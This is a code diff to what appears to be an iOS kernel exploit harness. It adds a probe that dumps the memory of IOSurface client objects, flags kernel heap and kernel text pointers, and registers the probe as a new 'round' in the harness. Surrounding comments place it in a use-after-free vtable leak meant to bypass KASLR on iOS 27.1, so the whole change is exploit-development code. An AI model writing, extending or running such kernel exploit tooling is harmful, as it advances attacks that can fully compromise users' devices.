@@ -15902,6 +15902,184 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r383: Re-map IOSurfaceClientRef layout on iOS 27.1.
+ * The earlier layout mapping (from r354-r377) may be incorrect.
+ * r382 showed:
+ *   - +88 is NOT a kernel heap pointer (shows 0, PAC-signed values, or small ints)
+ *   - +136 is NOT a surface ID (shows userspace pointer)
+ *   - The hex dump shows a completely different structure
+ *
+ * This probe:
+ * 1. Create surfaces with DISTINCTIVE parameters (unique width/height/pixelformat)
+ * 2. Use IOSurface API to get known values (ID, width, height, etc.)
+ * 3. Scan the entire client ref for those known values to map the layout
+ * 4. Identify which offset holds the surface ID, kernel pointer, base address
+ */
+static void r383_probe(void) {
+    rlog("\n=== r383: IOSurfaceClientRef Layout Re-Map ===\n\n");
+    fflush(stdout);
+
+    /* Create a surface with distinctive dimensions */
+    int w=0x37, h=0x53, bpe=4, bpr=0x37*4, pf=0x42475241, as_=0x37*0x53*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    if (!surf) {
+        rlog("FAILED to create surface\n");
+        goto r383_cleanup;
+    }
+
+    uint32_t sid = IOSurfaceGetID(surf);
+    size_t width = IOSurfaceGetWidth(surf);
+    size_t height = IOSurfaceGetHeight(surf);
+    size_t bytesPerRow = IOSurfaceGetBytesPerRow(surf);
+    size_t allocSize = IOSurfaceGetAllocSize(surf);
+    OSType pixFmt = IOSurfaceGetPixelFormat(surf);
+    uint32_t seed = IOSurfaceGetSeed(surf);
+    int useCount = IOSurfaceGetUseCount(surf);
+    void *baseAddr = IOSurfaceGetBaseAddress(surf);
+
+    rlog("  API values:\n");
+    rlog("    SurfaceID:    %u (0x%x)\n", sid, sid);
+    rlog("    Width:        %zu (0x%zx)\n", width, width);
+    rlog("    Height:       %zu (0x%zx)\n", height, height);
+    rlog("    BytesPerRow:  %zu (0x%zx)\n", bytesPerRow, bytesPerRow);
+    rlog("    AllocSize:    %zu (0x%zx)\n", allocSize, allocSize);
+    rlog("    PixelFormat:  0x%x\n", pixFmt);
+    rlog("    Seed:         %u\n", seed);
+    rlog("    UseCount:     %d\n", useCount);
+    rlog("    BaseAddress:  %p\n", baseAddr);
+
+    /* Dump the ENTIRE client ref (448 bytes, 8 bytes at a time) */
+    uint8_t *cref = (uint8_t*)surf;
+    rlog("\n  Full 448-byte hex dump:\n");
+    for (int off = 0; off < 448; off += 8) {
+        uint64_t v;
+        memcpy(&v, cref + off, 8);
+
+        /* Annotate known values */
+        const char *note = "";
+        uint32_t v32lo = (uint32_t)(v & 0xFFFFFFFF);
+        uint32_t v32hi = (uint32_t)(v >> 32);
+
+        if (v == (uint64_t)(uintptr_t)baseAddr) note = " <== BaseAddress";
+        else if (v32lo == sid && v32hi == 0) note = " <== SurfaceID (lo32)";
+        else if (v32lo == sid) note = " <== SurfaceID in lo32";
+        else if (v32hi == sid) note = " <== SurfaceID in hi32";
+        else if (v == (uint64_t)width) note = " <== Width";
+        else if (v == (uint64_t)height) note = " <== Height";
+        else if (v == (uint64_t)bytesPerRow) note = " <== BytesPerRow";
+        else if (v == (uint64_t)allocSize) note = " <== AllocSize";
+        else if (v32lo == pixFmt) note = " <== PixelFormat (lo32)";
+        else if (v == 0x4d55545a4d55545aULL) note = " <== MUTZMUTZ";
+        else if (v32lo == 0x4d55545a || v32hi == 0x4d55545a) note = " <== MUTZ";
+        else if (v >= 0xffffffe000000000ULL && v < 0xfffffff000000000ULL) note = " <== KHEAP?";
+        else if (v >= 0xfffffff000000000ULL && v <= 0xfffffff7ffffffffULL) note = " <== KTEXT!";
+
+        rlog("    +%3d: 0x%016llx%s\n", off, (unsigned long long)v, note);
+    }
+
+    /* Also search specifically for the surface ID as a 32-bit value at every 4-byte offset */
+    rlog("\n  SurfaceID (%u/0x%x) search at 4-byte granularity:\n", sid, sid);
+    for (int off = 0; off < 448; off += 4) {
+        uint32_t v32;
+        memcpy(&v32, cref + off, 4);
+        if (v32 == sid) {
+            rlog("    +%d: MATCH (0x%x)\n", off, v32);
+        }
+    }
+
+    /* Search for width (0x37) and height (0x53) as various sizes */
+    rlog("\n  Width=0x%x search:\n", (unsigned)w);
+    for (int off = 0; off < 448; off += 4) {
+        uint32_t v32;
+        memcpy(&v32, cref + off, 4);
+        if (v32 == (uint32_t)w) {
+            rlog("    +%d: MATCH\n", off);
+        }
+    }
+    rlog("  Height=0x%x search:\n", (unsigned)h);
+    for (int off = 0; off < 448; off += 4) {
+        uint32_t v32;
+        memcpy(&v32, cref + off, 4);
+        if (v32 == (uint32_t)h) {
+            rlog("    +%d: MATCH\n", off);
+        }
+    }
+
+    /* Search for BytesPerRow and AllocSize */
+    rlog("  BytesPerRow=0x%x search:\n", (unsigned)bpr);
+    for (int off = 0; off < 448; off += 4) {
+        uint32_t v32;
+        memcpy(&v32, cref + off, 4);
+        if (v32 == (uint32_t)bpr) {
+            rlog("    +%d: MATCH\n", off);
+        }
+    }
+    rlog("  PixelFormat=0x%x search:\n", (unsigned)pf);
+    for (int off = 0; off < 448; off += 4) {
+        uint32_t v32;
+        memcpy(&v32, cref + off, 4);
+        if (v32 == (uint32_t)pf) {
+            rlog("    +%d: MATCH\n", off);
+        }
+    }
+
+    /* Create a SECOND surface with different dimensions to compare */
+    int w2=0xAB, h2=0xCD;
+    int bpr2=0xAB*4, as2=0xAB*0xCD*4;
+    CFRelease(nW); CFRelease(nH); CFRelease(nR); CFRelease(nA);
+    nW = CFNumberCreate(NULL, kCFNumberIntType, &w2);
+    nH = CFNumberCreate(NULL, kCFNumberIntType, &h2);
+    nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr2);
+    nA = CFNumberCreate(NULL, kCFNumberIntType, &as2);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    IOSurfaceRef surf2 = IOSurfaceCreate(props);
+    if (surf2) {
+        uint32_t sid2 = IOSurfaceGetID(surf2);
+        uint8_t *cref2 = (uint8_t*)surf2;
+        rlog("\n  Surface 2: sid=%u w=0x%x h=0x%x\n", sid2, w2, h2);
+
+        /* Show differences between surf and surf2 at every offset */
+        rlog("  Offsets that differ (key layout indicators):\n");
+        for (int off = 0; off < 448; off += 8) {
+            uint64_t v1, v2;
+            memcpy(&v1, cref + off, 8);
+            memcpy(&v2, cref2 + off, 8);
+            if (v1 != v2) {
+                rlog("    +%3d: s1=0x%016llx s2=0x%016llx\n",
+                    off, (unsigned long long)v1, (unsigned long long)v2);
+            }
+        }
+        CFRelease(surf2);
+    }
+
+    r383_cleanup:
+    if (surf) CFRelease(surf);
+    CFRelease(props);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+
+    rlog("\n=== r383 complete ===\n");
+    fflush(stdout);
+}
+
 /* r382: UAF-based vtable pointer leak for KASLR bypass.
  * Strategy:
  * 1. Create surfaces A, B with original 4096-byte alloc (kptr verified in r354-r356)
@@ -59290,6 +59468,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 386) {
+            rlog("*** rounds=386: IOSurfaceClientRef Layout Re-Map ***\n");
+            rlog("  Full dump + field matching with distinctive params.\n\n");
+            fflush(stdout);
+            r383_probe();
+            goto done;
+        }
         if (rounds == 385) {
             rlog("*** rounds=385: UAF Vtable Leak + Client Ref Full Scan ***\n");
             rlog("  Full 448-byte scan, backing store residue, UAF cross-surface.\n\n");
@@ -61577,7 +61762,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
